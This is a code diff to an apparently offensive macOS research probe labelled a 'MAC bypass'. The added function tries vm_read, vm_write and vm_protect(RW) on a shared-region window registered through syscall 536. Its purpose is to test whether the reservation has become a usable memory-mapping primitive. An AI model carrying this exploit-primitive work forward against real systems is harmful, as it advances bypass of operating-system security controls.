@@ -42,7 +42,7 @@
 #import <mach/vm_map.h>
 #import <mach-o/dyld.h>
 
-#define P022_BUILD       @"p022-sffd-neg1-mac-bypass-v41"
+#define P022_BUILD       @"p022-sffd-neg1-mac-bypass-v42"
 #define P022_SYS_536     536u
 
 /* v5 slide_info geometry (Ghidra-pinned) */
@@ -188,6 +188,35 @@ static int p022_call536(uint32_t filesCount, uint8_t *files,
     return errno;
 }
 
+/* v42 instantiation discriminators: read / write / protect the window.
+   The 536 lane's open question = "accepted but NOT instantiated" (v40).
+   If ANY of these succeed against a registered window — especially
+   vm_protect raising to RW — the reservation is a live VM object in OUR
+   map and the lane upgrades from reservation to mapping primitive. */
+static void p022_vm_discriminator(uint64_t addr, uint64_t size) {
+    /* read */
+    vm_address_t rd = (vm_address_t)addr;
+    vm_size_t rdsz = 0;
+    kern_return_t krr = vm_read(mach_task_self(), rd, (vm_size_t)size, &rd, &rdsz);
+    p022_log(@"  [disc] vm_read        → kr=0x%x size=0x%llx", krr,
+          (unsigned long long)rdsz);
+    if (krr == KERN_SUCCESS) {
+        (void)vm_deallocate(mach_task_self(), rd, rdsz);
+    }
+    /* write */
+    uint8_t wbuf[64];
+    memset(wbuf, 0x42, sizeof(wbuf));
+    kern_return_t krw = vm_write(mach_task_self(), (vm_address_t)addr,
+                                 (vm_offset_t)wbuf, sizeof(wbuf));
+    p022_log(@"  [disc] vm_write(0x42) → kr=0x%x", krw);
+    /* protect: raise to RW */
+    kern_return_t krp = vm_protect(mach_task_self(), (vm_address_t)addr,
+                                   (vm_size_t)size, FALSE,
+                                   VM_PROT_READ | VM_PROT_WRITE);
+    p022_log(@"  [disc] vm_protect(RW) → kr=0x%x%s", krp,
+          krp == KERN_SUCCESS ? @" ← LIVE VM OBJECT" : @"");
+}
+
 /* Residency probe: returns YES if a region covers `addr`, fills outputs. */
 static BOOL p022_residency(uint64_t addr, uint64_t *outRegion,
                            uint64_t *outSize, int *outProt,
@@ -230,9 +259,10 @@ static BOOL p022_guarded_read(uint64_t addr, uint64_t *outVal) {
 
     p022_log(@"=== p022GC session %@ BUILD %@ ===", LabLocalMilitaryNow(), P022_BUILD);
     p022_log(@" ");
-    p022_log(@"v41: H1 shared-region-window placement vs H2 file-backed bind.");
-    p022_log(@"v40 verdict: no-file accepted at 0x800000000 but NOT instantiated");
-    p022_log(@"(prot-0/0 reserved region; read = SIGBUS). This build SURVIVES faults.");
+    p022_log(@"v42: v41 H1/H2 + instantiation discriminators (vm_read/vm_write/");
+    p022_log(@"vm_protect against the registered window). v40 verdict: accepted");
+    p022_log(@"but NOT instantiated — if vm_protect(RW) succeeds, the reservation");
+    p022_log(@"is a live VM object in OUR map and the 536 lane upgrades. SURVIVES faults.");
     p022_log(@"ALL-0xFFFF slide_info → zero stores. Probe only.");
     p022_log(@" ");
 
@@ -262,6 +292,7 @@ static BOOL p022_guarded_read(uint64_t addr, uint64_t *outVal) {
     } else {
         p022_log(@"  residency → no region (unexpected for the window)");
     }
+    p022_vm_discriminator(V41_SHARED_ADDR, V41_SHARED_SIZE);
 
     uint64_t val1 = 0;
     BOOL ok1 = p022_guarded_read(V41_SHARED_ADDR, &val1);
@@ -295,6 +326,7 @@ static BOOL p022_guarded_read(uint64_t addr, uint64_t *outVal) {
               ctrlFd, r, eb, p022_errno_name(eb));
         if (eb == 0) {
             p022_log(@"  ★★★ FILE-BACKED RW ACCEPTED — exec was the MAC trigger ★★★");
+            p022_vm_discriminator(V41_SHARED_ADDR, V41_SHARED_SIZE);
             uint64_t val2 = 0;
             BOOL ok2 = p022_guarded_read(V41_SHARED_ADDR, &val2);
             if (ok2) {
